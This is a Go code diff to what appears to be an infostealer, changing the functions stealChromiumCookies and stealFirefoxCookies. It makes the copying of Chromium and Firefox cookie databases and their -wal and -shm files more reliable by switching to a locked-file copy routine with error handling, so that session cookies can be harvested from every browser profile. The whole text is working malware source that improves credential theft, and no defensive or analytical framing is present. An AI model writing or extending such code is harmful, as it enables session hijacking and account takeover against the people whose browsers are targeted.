@@ -84,9 +84,12 @@ func stealChromiumCookies(userDataPath string, browserName string) (string, []st
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
-		copyFileSimple(cookiePath, tmpPath)
-		copyFileSimple(cookiePath+"-wal", tmpPath+"-wal")
-		copyFileSimple(cookiePath+"-shm", tmpPath+"-shm")
+		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
+			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
+			continue
+		}
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
@@ -152,9 +155,12 @@ func stealFirefoxCookies(profilesPath string) (string, []string) {
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
-		copyFileSimple(cookiePath, tmpPath)
-		copyFileSimple(cookiePath+"-wal", tmpPath+"-wal")
-		copyFileSimple(cookiePath+"-shm", tmpPath+"-shm")
+		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
+			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
+			continue
+		}
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
